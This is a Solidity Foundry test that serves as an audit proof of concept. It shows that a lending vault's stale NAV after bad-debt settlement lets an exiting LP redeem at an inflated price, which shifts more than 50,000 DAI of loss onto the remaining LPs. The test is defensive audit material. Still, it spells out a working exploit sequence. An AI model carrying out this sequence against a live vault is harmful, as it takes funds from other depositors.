// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {MockPriceFeed} from "contracts/v1/test/MockPriceFeed.sol";
import {LoanUtils} from "./utils/LoanUtils.sol";
import {VaultTestV2} from "./VaultV2.t.sol";
import {OrderV2ConfigurationParams} from "contracts/v2/vault/VaultStorageV2.sol";

/// @notice Audit regression proof for the stale-NAV bad-debt window.
/// @dev Uses the protocol's own VaultTestV2 deployment/setup and only normal protocol calls.
///      No vm.store, deal(), token balance overwrite, synthetic vault shares, or contract patching.
///      The oracle update models an exogenous collateral-price move; it is not an attacker step.
contract VaultBadDebtScaleAudit is VaultTestV2 {
    function testAudit_ScaledRealizedLossIsShiftedToRemainingLPs() public {
        // VaultTestV2.setUp() creates a 10_000e18 FT/XT seed position only to fund unrelated
        // tests. Burn that seed through the real market API so it cannot dilute this scenario's
        // maturity redemption fraction. No storage or balances are overwritten.
        vm.prank(deployer);
        res.market.burn(deployer, 10_000e18);

        // Fund the vault with two independent large LPs through the public ERC-4626 path.
        // Together with the upstream setup depositor this leaves multiple real share owners.
        address exitingLp = vm.randomAddress();
        address victimLp = vm.randomAddress();
        uint256 lpDeposit = 500_000e8;
        _depositLp(exitingLp, lpDeposit);
        _depositLp(victimLp, lpDeposit);

        // Configure a larger but still bounded order using the vault's real curator API.
        // This is strategy setup, not an attacker privilege. The attacker step later is only redeem().
        address[] memory orders = new address[](1);
        orders[0] = address(res.order);
        OrderV2ConfigurationParams[] memory configs = new OrderV2ConfigurationParams[](1);
        configs[0] = OrderV2ConfigurationParams({
            maxXtReserve: maxCapacity,
            virtualXtReserve: 1_000_000e8,
            originalVirtualXtReserve: 0,
            curveCuts: orderConfig.curveCuts
        });
        vm.prank(curator);
        vault.updateOrdersConfiguration(orders, configs);

        // Scale the exact upstream buyXt() exposure by 800x.
        vm.warp(currentTime + 2 days);
        buyXt(3_857_534_240_000, 80_000_000_000_000); // 38,575.3424 DAI in, 800,000 XT out

        // Create a legitimate secured FT issuance. At the initial ~$2,000 collateral price,
        // 800 ETH backs 800,000 DAI debt at ~50% LTV.
        address borrower = vm.randomAddress();
        vm.startPrank(borrower);
        LoanUtils.fastMintGt(res, borrower, 800_000e8, 800e18);
        vm.stopPrank();

        // Model an external 75% collateral-price shock before maturity. The attacker does NOT
        // perform this step; it creates the underwater state the protocol's bad-debt mechanism
        // is explicitly designed to handle.
        (uint80 roundId, int256 oldCollateralPrice, uint256 startedAt,, uint80 answeredInRound) =
            res.collateralOracle.latestRoundData();
        assertGt(oldCollateralPrice, 0, "invalid initial collateral price");
        MockPriceFeed.RoundData memory shocked = MockPriceFeed.RoundData({
            roundId: roundId + 1,
            answer: oldCollateralPrice / 4,
            startedAt: startedAt,
            updatedAt: block.timestamp,
            answeredInRound: answeredInRound + 1
        });
        vm.prank(deployer);
        res.collateralOracle.updateRoundData(shocked);

        vm.warp(currentTime + 92 days);

        uint256 lpShares = vault.balanceOf(exitingLp);
        uint256 totalSupplyBefore = vault.totalSupply();
        uint256 nominalAssetsBefore = vault.totalAssets();
        assertGt(lpShares, 0, "LP has no shares");
        assertGt(vault.balanceOf(victimLp), 0, "victim LP has no shares");
        assertGt(totalSupplyBefore, lpShares, "no remaining LP after exit");

        // Curator performs normal maturity settlement. The bug is the stale NAV left afterwards.
        vm.prank(curator);
        vault.redeemOrder(res.order);

        uint256 badDebt = vault.badDebtMapping(address(res.collateral));
        uint256 deliveredCollateral = res.collateral.balanceOf(address(vault));
        assertGt(badDebt, 0, "scenario produced no bad debt");

        (, int256 collateralPrice,,,) = res.collateralOracle.latestRoundData();
        (, int256 debtPrice,,,) = res.debtOracle.latestRoundData();
        assertGt(collateralPrice, 0, "invalid shocked collateral price");
        assertGt(debtPrice, 0, "invalid debt-token price");

        uint256 collateralUnit = 10 ** res.collateral.decimals();
        uint256 debtUnit = 10 ** res.debt.decimals();
        uint256 deliveredValueInDebt = Math.mulDiv(
            deliveredCollateral,
            uint256(collateralPrice) * debtUnit,
            collateralUnit * uint256(debtPrice),
            Math.Rounding.Floor
        );
        uint256 realizedLoss = badDebt > deliveredValueInDebt ? badDebt - deliveredValueInDebt : 0;
        assertGt(realizedLoss, 0, "delivered collateral fully covers bad debt");

        // Settlement has recorded a real economic loss, yet NAV and share supply remain unchanged.
        assertEq(vault.totalAssets(), nominalAssetsBefore, "settlement unexpectedly haircutted totalAssets");
        assertEq(vault.totalSupply(), totalSupplyBefore, "settlement unexpectedly changed share supply");

        uint256 stalePayout = vault.previewRedeem(lpShares);
        uint256 economicAssets = vault.totalAssets() - realizedLoss;
        uint256 fairPayout = Math.mulDiv(lpShares, economicAssets + 1, totalSupplyBefore + 1, Math.Rounding.Floor);
        uint256 shiftedLoss = stalePayout - fairPayout;
        assertGt(shiftedLoss, 50_000e8, "loss shift did not exceed 50,000 DAI");

        // Only attacker action: ordinary permissionless ERC-4626 redeem of their own shares.
        uint256 lpBalanceBefore = res.debt.balanceOf(exitingLp);
        vm.prank(exitingLp);
        uint256 assetsOut = vault.redeem(lpShares, exitingLp, exitingLp);
        assertEq(assetsOut, stalePayout, "LP was not paid stale NAV");
        assertEq(res.debt.balanceOf(exitingLp) - lpBalanceBefore, stalePayout, "LP did not receive underlying");
        assertEq(
            vault.badDebtMapping(address(res.collateral)), badDebt, "ordinary redeem unexpectedly retired recorded bad debt"
        );

        // Conservation proof: every extra DAI received by the early LP is an extra DAI of
        // economic loss forced onto the share holders who remain in the vault.
        uint256 actualRemainingEconomicAssets = vault.totalAssets() - realizedLoss;
        uint256 fairRemainingEconomicAssets = economicAssets - fairPayout;
        uint256 extraLossOnRemainingLps = fairRemainingEconomicAssets - actualRemainingEconomicAssets;
        assertApproxEqAbs(extraLossOnRemainingLps, shiftedLoss, 2, "exit gain is not conserved as victim loss");

        emit log_named_uint("bad debt raw", badDebt);
        emit log_named_uint("delivered collateral raw", deliveredCollateral);
        emit log_named_uint("delivered collateral value in debt raw", deliveredValueInDebt);
        emit log_named_uint("realized net loss raw", realizedLoss);
        emit log_named_uint("exiting LP shares", lpShares);
        emit log_named_uint("stale redeem payout raw", stalePayout);
        emit log_named_uint("fair loss-adjusted payout raw", fairPayout);
        emit log_named_uint("loss shifted to remaining LPs raw", shiftedLoss);
    }

    function _depositLp(address lp, uint256 amount) internal {
        res.debt.mint(lp, amount);
        vm.startPrank(lp);
        res.debt.approve(address(vault), amount);
        vault.deposit(amount, lp);
        vm.stopPrank();
    }
}
